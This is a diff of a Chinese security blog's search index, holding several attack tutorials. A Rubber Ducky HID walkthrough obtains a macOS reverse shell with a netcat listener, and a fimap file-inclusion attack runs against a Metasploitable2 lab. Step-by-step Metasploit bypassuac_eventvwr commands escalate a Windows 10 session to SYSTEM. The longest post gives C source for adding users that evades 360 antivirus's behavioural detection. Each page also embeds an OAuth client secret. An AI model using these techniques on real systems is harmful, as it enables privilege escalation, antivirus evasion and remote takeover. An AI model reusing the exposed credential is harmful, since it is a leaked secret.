-<li>首先呢 我们可以看到在nethunter客户端上可以看到有（DuckHunter HID ）字样，其实他就是模拟黄鸭，USB Rubber Ducky脚本转换为NetHunter HID攻击格式。<br>&nbsp;<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/3B83EDEB-6401-47BD-97AC-F67EBA4912F1.png" alt="enter description here"><br>&nbsp;<br>&nbsp;<br>在默认的选项我们可以看到他给我们提供了默认的几个选项，其中有两个脚本呢 是针对Mac OSX 的HID攻击，攻击后呢<br>返回一个shell连接，这里其中有perl和Ruby两个脚本，我们就选择其中一个选择ruby。<br><img src="http://ojg8j426f.bkt.clouddn.com/9DA2E76E-459B-4295-902B-3EF8FF5F87B2.png" alt="enter description here"><br>&nbsp;<br>&nbsp;<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2>选择ruby脚本。我们来简单的看下代码的意思<br><img src="http://ojg8j426f.bkt.clouddn.com/1CF817DC-6562-446F-9850-D88922A5E14E.png" alt="enter description here"><br>&nbsp;<br>&nbsp;<br>0X03<br>1.COMMAND SPACE—–在mac的快捷键表示为搜索框搜索<br><img src="http://ojg8j426f.bkt.clouddn.com/6A323763-0ACE-4230-8638-42AE41A643C9.png" alt="enter description here"><br>&nbsp;<br>2.STRING terminal  ENTER——–输入字符串terminal 搜索终端，并按下回车<br><img src="http://ojg8j426f.bkt.clouddn.com/432C200A-9E1E-423E-A928-CC24DC452D75.png" alt="enter description here"><br>&nbsp;<br>3.Command+n就是新建的快捷键，功能是新建一个项目，在不同程序有不同的新建项目种类。<br><img src="http://ojg8j426f.bkt.clouddn.com/82B4B55D-25D0-4B43-91B9-3C587FF2B470.png" alt="enter description here"><br>&nbsp;<br>4.在终端下输入字符串使用ruby socket建立服务端<br><img src="http://ojg8j426f.bkt.clouddn.com/4F756B21-2BF7-4F64-929B-D1F2044789F8.png" alt="enter description here"><br>&nbsp;<br>5.当然了在这段代码也我们提示了 使用netcat（nc ）建立监听 并返回会话，他这里0.0.0.0提示我们更改我们黑手nethunter的ip地址。<br>如：<br>查看黑手使用的ip<br><img src="http://ojg8j426f.bkt.clouddn.com/FF774580-92C6-4BFE-A2C0-3AE59A011A21.png" alt="enter description here"><br>&nbsp;<br>&nbsp;<br><strong><span style="color: #008000;">更改ip</span><br><img src="http://ojg8j426f.bkt.clouddn.com/1BB5C440-F798-4F15-B2F3-3830EFD44FA9.png" alt="enter description here"><br>&nbsp;<br>&nbsp;<br><strong><span style="color: #008000;">保存脚本</span><br><img src="http://ojg8j426f.bkt.clouddn.com/3F33287D-827C-4CC0-BFEE-FFA398CE9FBE.png" alt="enter description here"><br>&nbsp;<br>&nbsp;<h2 id="0X04"><a href="#0X04" class="headerlink" title="0X04"></a>0X04</h2>1.<strong><span style="color: #008000;">并且在终端中使用nc命令建立监听 </span>———nc -vv -l -p 1337<br><img src="http://ojg8j426f.bkt.clouddn.com/DD63EB85-CE67-447A-A17E-D7E16EF7BB22.png" alt="enter description here"></strong></strong></strong></li>
-</ol>
-<p>&nbsp;<br>&nbsp;<br>2 .点击三角按钮，<strong><span style="color: #008000;">执行攻击</span>。<br><img src="http://ojg8j426f.bkt.clouddn.com/1833878B-24B2-48BD-8438-0EDD524619D7.png" alt="enter description here"></strong></p>
-<p>&nbsp;<br>&nbsp;<br>3.<strong><span style="color: #008000;">返回shell连接</span><br>&nbsp;<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/7DD01722-EC8C-43AD-94F9-3D7BF4A7398D.png" alt="enter description here"><br>&nbsp;<br>&nbsp;<br><span style="color: #008000;">最终结果：</span><br><img src="http://ojg8j426f.bkt.clouddn.com/9E207E32-F824-4000-BC11-7207FDA27AC1.png" alt="enter description here"><br>&nbsp;<br>&nbsp;<br>更多项目可在github–USBDucky 项目中寻找你需要的PAYLOAD。<br><a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads" target="_blank" rel="external">https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads</a><br>&nbsp;<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1492519263301.jpg" alt="enter description here"></strong></p>
-<h2 id="视频演示"><a href="#视频演示" class="headerlink" title="视频演示"></a>视频演示</h2><p>可观看个人演示的视频</p>
-<p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p>
-<script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script>
-<script>
-    var ivaInstance = new Iva('ivaLive', {
-        appkey: 'By9WGzBIx', //应用标示
-        video: 'http://oc78wb8cz.bkt.clouddn.com/DuckHunterHID.mp4', //视频
-        title: 'test', //视频标题，后台视频管理中的标题
-        cover: '' //视频封面，只有在autoplay:false才可生效
-    });
-</script>
-<script src="//cytroncdn.videojj.com/latest/Iva.js"></script>
-
-<p><img src="http://ojg8j426f.bkt.clouddn.com/625CE7389F506CD27830E0AC9450F043.jpg" alt="enter description here"><br>&nbsp;<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/926EC2F4CAA40850C68695B568ED7C5E.jpg" alt="enter description here"><br>&nbsp;<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/958E71B5A3E801BBD876231B610B9B67.jpg" alt="enter description here"><br>&nbsp;<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/0C3A8A27E4B981F504D4EA54E2BE8BFC.jpg" alt="enter description here"></p>
-<p><div id="container"></div></p>
-<p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p>
-<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
-<script>
-  var gitment = new Gitment({
-    owner: 'secistblog',
-    repo: 'secistblog.github.io',
-    oauth: {
-      client_id: '31ca58bed60fa9231b5f',
-      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',
-    },
-  })
-  gitment.render('container')
-</script>
-
-
-]]></content>
-      
-        <categories>
-            
-            <category> kali </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> kali </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Fimap_Metasploitable2漏洞攻击]]></title>
-      <url>/fimap_metasploitable2%20.html</url>
-      <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/hack-like-pro-linux-basics-for-aspiring-hacker-part-10-manipulating-text.1280x600.jpg" alt="enter description here"><br><a id="more"></a></p>
-<p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=31090440&auto=0&height=66"></iframe></p>
-<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Fimap是一款本地及远程的文件包含漏洞检测工具，并能对检测到的漏洞进行利用，带了一个google的语法搜索功能，这款工具只针对文件包含漏洞的检测及利用.<br>&nbsp;<br>&nbsp;<br>本次使用到的环境：docker_kali      攻击者<br>                                metasploitable2 靶机环境<br>&nbsp;</p>
-<h2 id="kali中自带的工具-fimap"><a href="#kali中自带的工具-fimap" class="headerlink" title="kali中自带的工具:fimap"></a>kali中自带的工具:fimap</h2><pre><code>&lt;p&gt; -H，--harvest
-模式为新URL收集URL。 需要一个根网址（-u）开始在那里爬网。   还需要（-w）为质量模式编写URL列表
-&amp;nbsp;    
-  -d，--depth = CRAWLDEPTH
-  您希望在收获模式（-H）下爬网目标网站的CRAWLDEPTH（递归级别）。默认值为1.
-   &amp;nbsp;
-  -x，--exploit
-  启动一个交互式会话，您可以在其中, 选择一个目标并执行某些操作
-  &amp;nbsp;
- -C，--enable-color
-    --force-run忽略实例检查，只要运行fimap。&lt;/p&gt;
-  &amp;nbsp;
-</code></pre><p>例子：</p>
-<pre><code>1. 简单扫描
-    ./fimap.py -u &apos;http://localhost/test.php?file=bang&amp;id=23&apos;
-2. 使用列表进行扫描
-    ./fimap.py -m -l &apos;/tmp/urllist.txt&apos;
-3. 使用谷歌语法搜索
-    ./fimap.py -g -q &apos;inurl:include.php&apos;
-4. 收集递归等级为3和的网页的所有链接  将URL写入 /tmp/urllist
-    ./fimap.py -H -u &apos;http://localhost&apos; -d 3 -w /tmp/urllist
-    参考资料：http://tools.kali.org/web-applications/fimap
-</code></pre><h2 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p>
-<script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script>
-<script>
-    var ivaInstance = new Iva('ivaLive', {
-        appkey: 'By9WGzBIx', //应用标示
-        video: 'http://oc78wb8cz.bkt.clouddn.com/fimap_metasploitasble2.mp4', //视频
-        title: 'test', //视频标题，后台视频管理中的标题
-        cover: '' //视频封面，只有在autoplay:false才可生效
-    });
-</script>
-<script src="//cytroncdn.videojj.com/latest/Iva.js"></script>
-
-<p>&nbsp;<br>&nbsp;<br>1.本次使用到的是metaspolitable2 靶机环境 ，我们打开浏览器输入该靶机的 ip<br>&nbsp;<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/88D2C627-A21A-4D32-BA8F-A99B10295CEA.png" alt="enter description here"><br>&nbsp;<br>&nbsp;<br>2.使用fimap的例子4 进行尝试检测 ：</p>
-<p><pre>fimap -H -u <a href="http://localhost" target="_blank" rel="external">http://localhost</a> -d 3 -w /tmp/urllist </pre><br>               <img src="http://ojg8j426f.bkt.clouddn.com/ED9EF7FC-9179-4DEC-8518-943F955A63E9.png" alt="enter description here"><br> &nbsp;<br> &nbsp;<br>  3.在上图中可以看到，对dvwa/dav/twiki/等进行扫描，图中对Mutillidae扫描的列表比较多。<br></p>
-<p><pre>mutillidae是一个免费，开源的Web应用程序，提供专门被允许的安全测试和入侵的Web应用程序。它是由Adrian “Irongeek” Crenshaw和Jeremy “webpwnized” Druin.开发的一款自由和开放源码的Web应用程序。其中包含了丰富的渗透测试项目，如SQL注入、跨站脚本、clickjacking、本地文件包含、远程代码执行等.</pre><br><br>对检测到的漏洞进行攻击，并忽略实例检查：<br> <pre>fimap -x  –force-run</pre><br> <img src="http://ojg8j426f.bkt.clouddn.com/E8C58339-2B1A-4DBF-9838-1D184DA11C86.png" alt="enter description here"><br>  &nbsp;<br>  &nbsp;</p>
-<p> 4.填写目标序列号1 。进入漏洞url列表，选择漏洞id 如选择1。<br><img src="http://ojg8j426f.bkt.clouddn.com/1A11FB48-777A-4832-83F5-F9030962F822.png" alt="enter description here"><br> &nbsp;<br> &nbsp;<br>5、执行攻击 选择攻击模式。如选择1<br><img src="http://ojg8j426f.bkt.clouddn.com/5EA09A65-D9CE-465E-9691-11EDBB932620.png" alt="enter description here"><br> &nbsp;<br> &nbsp;<br> 使用fimap 反弹shell 得到回话、<br> <img src="http://ojg8j426f.bkt.clouddn.com/B7414489-7646-473D-B6C8-FF55C9DBA1AE.png" alt="enter description here"><br> &nbsp;<br> &nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/49F45637-F5EF-45F6-A1D5-07A5F624F421.png" alt="enter description here"></p>
-<p><div id="container"></div></p>
-<p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p>
-<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
-<script>
-  var gitment = new Gitment({
-    owner: 'secistblog',
-    repo: 'secistblog.github.io',
-    oauth: {
-      client_id: '31ca58bed60fa9231b5f',
-      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',
-    },
-  })
-  gitment.render('container')
-</script>
-
-
-
-]]></content>
-      
-        <categories>
-            
-            <category> kali </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> kali </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[metaspolit_bypassuac_win10]]></title>
-      <url>/bypassuac-win10.html</url>
-      <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/slip-backdoor-into-php-websites-with-weevely.1280x600.jpg" alt="enter description here"><br><a id="more"></a></p>
-<h2 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p>
-<script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script>
-<script>
-    var ivaInstance = new Iva('ivaLive', {
-        appkey: 'By9WGzBIx', //应用标示
-        video: 'http://oc78wb8cz.bkt.clouddn.com/win10_bypassUAC.mp4', //视频
-        title: 'test', //视频标题，后台视频管理中的标题
-        cover: '' //视频封面，只有在autoplay:false才可生效
-    });
-</script>
-<script src="//cytroncdn.videojj.com/latest/Iva.js"></script>
-
-<p>&nbsp;<br>&nbsp;<br>当你得一个meterpreter会话，却提不了权怎么办？？<br>Demon：嘚吧嘚————<strong><span style="color: #ff0000;">此方法只能绕过本机防护机制，但是绕不过360等。以及此模块需更新最新版即可</span></strong><br>&nbsp;</p>
-<h2 id="第一步：搜索-bypassuac"><a href="#第一步：搜索-bypassuac" class="headerlink" title="第一步：搜索 bypassuac"></a>第一步：搜索 bypassuac</h2><p>  <pre>msf exploit(web_delivery) &gt; search bypassuac</pre><br>   &nbsp;<br>  &nbsp;<br>  &nbsp;</p>
-<h2 id="第二步-使用提权模块，进行对windows-uac绕过。"><a href="#第二步-使用提权模块，进行对windows-uac绕过。" class="headerlink" title="第二步: 使用提权模块，进行对windows uac绕过。"></a>第二步: 使用提权模块，进行对windows uac绕过。</h2><p>  <pre>msf  exploit(web_delivery) &gt; use    exploit/windows/local/bypassuac_eventvwr</pre><br>  &nbsp;<br>  &nbsp;<br>  &nbsp;<br>///  查看模块选项  <strong><span style="color: #ff0000;">msf exploit(bypassuac_eventvwr) &gt; </span></strong> options </p>
-<p>Module options (exploit/windows/local/bypassuac_eventvwr):</p>
-<p>   Name     Current Setting  Required  Description</p>
-<hr>
-<p>   SESSION                   yes       The session to run this module on.</p>
-<p>Exploit target:</p>
-<p>   Id  Name</p>
-<hr>
-<p>   0   Windows x86<br>/////////////<br>&nbsp;<br>&nbsp;<br>&nbsp;</p>
-<h2 id="第三步：-设置回话-（比如说我这里的话说是1）那就设置1"><a href="#第三步：-设置回话-（比如说我这里的话说是1）那就设置1" class="headerlink" title="第三步： 设置回话 （比如说我这里的话说是1）那就设置1"></a>第三步： 设置回话 （比如说我这里的话说是1）那就设置1</h2><p>  <pre>msf exploit(bypassuac_eventvwr) &gt; set SESSION 1   SESSION =&gt; 1</pre><br>  &nbsp;<br>  &nbsp;<br>  &nbsp;<br>  第四步： 执行exploit，执行提权。<br>  <pre>msf exploit(bypassuac_eventvwr) &gt; exploit</pre><br>  <img src="http://ojg8j426f.bkt.clouddn.com/3347C261-C404-42C2-91DF-F0127E0EEBA2.png" alt="enter description here"><br>&nbsp;<br>&nbsp;<br>&nbsp;</p>
-<h2 id="第五步-：查看会话，在这里你可以发现有2个回话。"><a href="#第五步-：查看会话，在这里你可以发现有2个回话。" class="headerlink" title="第五步 ：查看会话，在这里你可以发现有2个回话。"></a>第五步 ：查看会话，在这里你可以发现有2个回话。</h2><p>  <pre> msf exploit(bypassuac_eventvwr) &gt; sessions</pre><br>  <img src="http://ojg8j426f.bkt.clouddn.com/3B5F2DCE-F5FC-4BC0-90C7-C45341264BA1.png" alt="enter description here"></p>
-<p>&nbsp;<br>&nbsp;<br>&nbsp;</p>
-<h2 id="第六步：进入会话2。"><a href="#第六步：进入会话2。" class="headerlink" title="第六步：进入会话2。"></a>第六步：进入会话2。</h2><p>进入meterpreter会话，进行进一步的提权操作.<br>以<strong><span style="color: #ff0000;">及下面是提权前普通用户和 提权后system 最高权限对比！</span></strong></p>
-<p><img src="http://ojg8j426f.bkt.clouddn.com/26313E4C-3102-491D-9AE9-966F3AF09478.png" alt="enter description here"><br>&nbsp;<br>&nbsp;<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/465A28FB-C0F5-4D1B-A3B4-CF307434D661.png" alt="enter description here"></p>
-<p>  <div id="container"></div></p>
-<p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p>
-<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
-<script>
-  var gitment = new Gitment({
-    owner: 'secistblog',
-    repo: 'secistblog.github.io',
-    oauth: {
-      client_id: '31ca58bed60fa9231b5f',
-      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',
-    },
-  })
-  gitment.render('container')
-</script>
-
-
-
-
-<h2 id="视频中相关代码可复制"><a href="#视频中相关代码可复制" class="headerlink" title="视频中相关代码可复制"></a>视频中相关代码可复制</h2><p><strong><span style="color: #ff0000;">代码可直接复制！！！</span></strong></p>
-<p><strong><span style="color: #ff0000;">代码可直接复制！！！</span></strong></p>
-<p><strong><span style="color: #ff0000;">代码可直接复制！！！</span></strong></p>
-<p><strong><span style="color: #ff0000;">代码可直接复制！！！！</span></strong></p>
-<p>&nbsp;</p>
-<link rel="stylesheet" type="text/css" href="http://oc78wb8cz.bkt.clouddn.com/asciinema-player.css">
-
-<p>  <asciinema-player src="http://oc78wb8cz.bkt.clouddn.com/win10bypass_uac.json" cols="100" rows="30"></asciinema-player></p>
-  <script src="http://oc78wb8cz.bkt.clouddn.com/asciinema-player.js"></script>
-
-
-]]></content>
-      
-        <categories>
-            
-            <category> Metasploit </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> Metasploit </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[新增提问板块]]></title>
-      <url>/Discuss1.html</url>
-      <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/%E5%A3%81%E7%BA%B8.jpg" alt="enter description here"><br><a id="more"></a><br>&nbsp;</p>
-<p>这次新开了一个目的也是一个 增加一个留言板块，增进探讨和提问解决 与更多人参与讨论，方便一起解决,有什么问题可以交个我来进行生成md文档 ，上传本次问题，与更多朋友参与一起讨论探讨，方便解决问题！！</p>
-<pre><code>Demon 2017.9.12
-</code></pre><p>&nbsp;</p>
-<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=3941024&auto=0&height=66"></iframe>
-
-<p><div id="container"></div></p>
-<p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p>
-<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
-<script>
-  var gitment = new Gitment({
-    owner: 'secistblog',
-    repo: 'secistblog.github.io',
-    oauth: {
-      client_id: '31ca58bed60fa9231b5f',
-      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',
-    },
-  })
-  gitment.render('container')
-</script>
-
-
-]]></content>
-      
-        <categories>
-            
-            <category> 提问板块 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> 提问板块 </tag>
-            
-        </tags>
-        
-    </entry>
-    
-  
-  
+<search>
+  <entry>
+    <title><![CDATA[即刻安全纯技术交流群]]></title>
+    <url>%2Fjishu.html</url>
+    <content type="text"><![CDATA[&nbsp; 其实我自己也想了很多很多，其实有一段时间比较低迷，有想过退出这个圈子，但是最后还是很多位朋友鼓励我，不要放弃，话实话进入这个圈子，也算是刚刚好一年了，个人也是一位业余爱好者的身份，来进行和你们交流和探讨，自己也是忧郁了很久很久，最终 看到咱们即刻群，基本都是整天水群，斗图，我看着实在是不忍心，即刻安全也是我的一部分，我也是其中的一份子，我的开始就是即刻安全！！即刻安全花费了我的很多心血，所以我重新开始整段群，创建此群的初衷就是，无斗图、无广告、无水群的纯技术交流群。 &nbsp; 感谢各位朋友粉丝的大力支持，也是才有我们即刻安全的今天。 如有志同道合的朋友，欢迎加入我们即刻安全纯技术交流群：307283889 希望进群的朋友能遵守规则：莫斗图、莫水群，希望能打造更好的技术交流氛围 特此：即刻安全团体敬上 Demon 2017.8.27 &nbsp;&nbsp;]]></content>
+  </entry>
+  <entry>
+    <title><![CDATA[绕过安全防护敏感检测行为]]></title>
+    <url>%2FBypass3.html</url>
+    <content type="text"><![CDATA[投稿原作者：onion 1.思考昨天，通过静态免杀可以bypass国内杀软，当我们想执行一些敏感的操作时，…… 有很多时候，在渗透测试中，拿到了Webshell，查看了权限，发现是系统权限，很开心，但是往往防护软件会给你当头一棒，呵呵，添加用户的时候，却被360拦截… 那么如何解决呢？在这篇文章中，提供了一些思路http://www.91ri.org/13805.html 2.我有一个大胆的想法所以我就假设了一个想法：360安全卫士是一个应用程序，它是如何检测用户是是否添加用户的呢？答案当然是命令行了。假设它获取每一行命令去分析，然后判断是否拦截，那么肯定是使用的系统API吧？要不然程序员会头炸的。大概这样简单的设想，我们就开始验证了。在Windows编程中间，我们经常需要添加用户，删除用户，添加用户组等等功能，那些功能如何实现呢？搜索了一下windows提供的API，文末提高全功能源码。https://msdn.microsoft.com/en-us/library/aa370649(VS.85).aspx#本文需要的技术背景（visual c++编程基础，dos命令）环境，vm10 360安全卫士最新版，防护全部开启。&nbsp;&nbsp;然后再用API添加。 &nbsp;&nbsp;直接创建呢？发现失败了，基于行为检测。最后可以发现最新版本的360安全卫士已经pass&nbsp;&nbsp; 3.分析现在我们分析，假设服务器上net.exe被删除了怎么办？ #pragma comment(lib, “netapi32.lib”) 这行代码主要是导入了一个dll，名称为netapi32.dll 如果服务器上没有net.exe，我们将此dll和这个命令行工具上传至服务器，也是可以添加用户的，这就是以前的无net添加用户。 4.Code1234567891011121314151617181920212223242526272829303132333435363738394041```javascript//编译平台：VC++6.0 Win10专业版#ifndef UNICODE#define UNICODE#endif#include&lt;windows.h&gt;#include&lt;stdio.h&gt;#include&lt;assert.h&gt;#include&lt;lm.h&gt;#pragma comment(lib, &quot;netapi32.lib&quot;)int wmain(int argc, wchar_t *argv[])&#123; USER_INFO_1 ui; DWORD dwLevel = 1; DWORD dwError = 0; NET_API_STATUS nStatus; if (argc != 3) &#123; printf(&quot;==*==*=*=*=====*======*======*===*==*===*==*==*===*===*=&quot;); fwprintf(stderr, L&quot;\tUsage: %s UserName PassWord&quot;, argv[0]); printf(&quot;\n==*==*=*=*=====*======*======*===*==*===*==*==*===*===*=&quot;); exit(1); &#125; ui.usri1_name = argv[1]; ui.usri1_password = argv[2]; ui.usri1_priv = USER_PRIV_USER; ui.usri1_home_dir = NULL; ui.usri1_comment = NULL; ui.usri1_flags = UF_SCRIPT; ui.usri1_script_path = NULL; nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&amp;ui, &amp;dwError); if (nStatus == NERR_Success) fwprintf(stderr, L&quot;\n[*]User add success!! UserName is [%s] \n&quot;, argv[1]); else printf(&quot;Can not add user ... System Error Code is %d \nPlase go to https://msdn.microsoft.com/en-us/library/ms681381(v=vs.85).aspx &quot;, nStatus); return 0;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336/* UNICODE */#ifndef UNICODE#define UNICODE#endif/* 头文件 */#include &lt;stdio.h&gt;#include &lt;assert.h&gt;#include &lt;windows.h&gt; #include &lt;lm.h&gt;/************************************** AddUser* 功能 增加用户* 参数 szServerName，主机名，如果为本机增加用户，设置为NULL* szUserName，用户名* szPassword，密码**************************************/int AddUser(LPWSTR szServerName, LPWSTR szUserName, LPWSTR szPassword)&#123; USER_INFO_1 ui; DWORD dwLevel = 1; // 使用 USER_INFO_1 作为参数 DWORD dwError = 0; NET_API_STATUS nStatus; // 填充 USER_INFO_1 ui.usri1_name = szUserName; // 用户名 ui.usri1_password = szPassword; // 密码 ui.usri1_priv = USER_PRIV_USER; // privilege ui.usri1_home_dir = NULL; ui.usri1_comment = NULL; ui.usri1_flags = UF_SCRIPT; ui.usri1_script_path = NULL; // 调用 NetUserAdd 增加用户 nStatus = NetUserAdd(szServerName, dwLevel, (LPBYTE)&amp;ui, &amp;dwError); // 判断结果 if (nStatus == NERR_Success) &#123; wprintf(stderr, L&quot;User %s has been successfully added on %s\n&quot;, szUserName, szServerName); &#125; else &#123; fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus); &#125; return 0;&#125;/************************************** AddUserToGroup* 功能 为用户组增加用户* 参数 szServerName，主机名，如果为本机，设置为NULL* szUserName，用户名* szGroup，用户组名**************************************/int AddUserToGroup(LPWSTR szServerName, LPWSTR szUserName, LPWSTR szGroup)&#123; NET_API_STATUS nStatus; // 调用 NetGroupAddUser nStatus = NetGroupAddUser( szServerName, szGroup, szUserName ); // 判断结果 if (nStatus == NERR_Success) fwprintf(stderr, L&quot;User %s has been successfully added on %s\n&quot;, szUserName, szServerName); else fprintf(stderr, &quot;NetGroupAddUser A system error has occurred: %d\n&quot;, nStatus); return 0;&#125;/************************************** DelUser* 功能 删除用户* 参数 szServerName，主机名，如果为本机，设置为NULL* szUserName，用户名**************************************/int DelUser(LPWSTR szServerName, LPWSTR szUserName)&#123; DWORD dwError = 0; NET_API_STATUS nStatus; // 调用 NetUserDel 删除用户 nStatus = NetUserDel(szServerName, szUserName); // 判断并显示结果 if (nStatus == NERR_Success) fwprintf(stderr, L&quot;User %s has been successfully deleted on %s\n&quot;, szUserName, szServerName); else fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus); return 0;&#125;/************************************** int ListUsers(LPWSTR pszServerName)* 功能 列举用户* 参数 szServerName，主机名，如果为本机，设置为NULL**************************************/int ListUsers(LPWSTR pszServerName)&#123; LPUSER_INFO_0 pBuf = NULL; LPUSER_INFO_0 pTmpBuf; DWORD dwLevel = 0; DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH; DWORD dwEntriesRead = 0; DWORD dwTotalEntries = 0; DWORD dwResumeHandle = 0; DWORD i; DWORD dwTotalCount = 0; NET_API_STATUS nStatus; // 循环，直到可以成功调用 NetUserEnum do &#123; // 调用NetUserEnum函数 nStatus = NetUserEnum(pszServerName, dwLevel,// 这里设置为0，使用 LPUSER_INFO_0 返回结果 FILTER_NORMAL_ACCOUNT, // 只列举“正常”类型的用户 (LPBYTE*)&amp;pBuf,// LPUSER_INFO_0 保存返回结果 // MAX_PREFERRED_LENGTH，内存由API分配，需要在之后调用NetApiBufferFree释放 dwPrefMaxLen, &amp;dwEntriesRead,// 读了的 Entries &amp;dwTotalEntries,// 一共的 Entries &amp;dwResumeHandle); // 判断是否成功 if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA)) &#123; if ((pTmpBuf = pBuf) != NULL) &#123; // 循环读取用户信息 for (i = 0; (i &lt; dwEntriesRead); i++) &#123; assert(pTmpBuf != NULL); if (pTmpBuf == NULL) &#123; fprintf(stderr, &quot;An access violation has occurred\n&quot;); break; &#125; // 输出 wprintf(L&quot;\t-- %s\n&quot;, pTmpBuf-&gt;usri0_name); // 下一个 pTmpBuf++; dwTotalCount++; &#125; &#125; &#125; else fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus); // 释放内存 if (pBuf != NULL) &#123; NetApiBufferFree(pBuf); pBuf = NULL; &#125; &#125; while (nStatus == ERROR_MORE_DATA); // end do // 释放内存 if (pBuf != NULL) NetApiBufferFree(pBuf); fprintf(stderr, &quot;Total of %d users\n\n&quot;, dwTotalCount); return 0;&#125;/************************************** int ListGroup(LPWSTR pszServerName)* 功能 列举用户组* 参数 szServerName，主机名，如果为本机，设置为NULL**************************************/int ListGroup(LPWSTR pszServerName)&#123; DWORD dwLevel = 0; DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH; DWORD dwEntriesRead = 0; DWORD dwTotalEntries = 0; DWORD dwResumeHandle = 0; DWORD i; DWORD dwTotalCount = 0; NET_API_STATUS nStatus; LPLOCALGROUP_INFO_0 pBuf = NULL; LPLOCALGROUP_INFO_0 pTmpBuf; do // begin do &#123; // 调用NetLocalGroupEnum 参数设置与NetLocalGroup类似 nStatus = NetLocalGroupEnum( pszServerName, 0, (LPBYTE*)&amp;pBuf, dwPrefMaxLen, &amp;dwEntriesRead, &amp;dwTotalEntries, &amp;dwResumeHandle); // 判断结果 if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA)) &#123; if ((pTmpBuf = pBuf) != NULL) &#123; // 循环输出 for (i = 0; (i &lt; dwEntriesRead); i++) &#123; assert(pTmpBuf != NULL); if (pTmpBuf == NULL) &#123; fprintf(stderr, &quot;An access violation has occurred\n&quot;); break; &#125; wprintf(L&quot;\t-- %s\n&quot;, pTmpBuf-&gt;lgrpi0_name); pTmpBuf++; dwTotalCount++; &#125; &#125; &#125; else fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus); // 释放内存 if (pBuf != NULL) &#123; NetApiBufferFree(pBuf); pBuf = NULL; &#125; &#125; while (nStatus == ERROR_MORE_DATA); // end do if (pBuf != NULL) NetApiBufferFree(pBuf); fprintf(stderr, &quot;Total of %d groups\n\n&quot;, dwTotalCount); return 0;&#125;/************************************** ShowUsersInfo* 功能 显示指定用户的信息* 参数 szServerName，主机名，如果为本机，设置为NULL* pszUserName，用户名**************************************/int ShowUsersInfo(LPWSTR pszServerName,LPWSTR pszUserName)&#123; DWORD dwLevel = 4;// 使用 LPUSER_INFO_4 返回结果 LPUSER_INFO_4 pBuf = NULL; NET_API_STATUS nStatus; nStatus = NetUserGetInfo(pszServerName, pszUserName, dwLevel, // pBuf参数类型 (LPBYTE *)&amp;pBuf); // 判断并输出结果 if (nStatus == NERR_Success) &#123; if 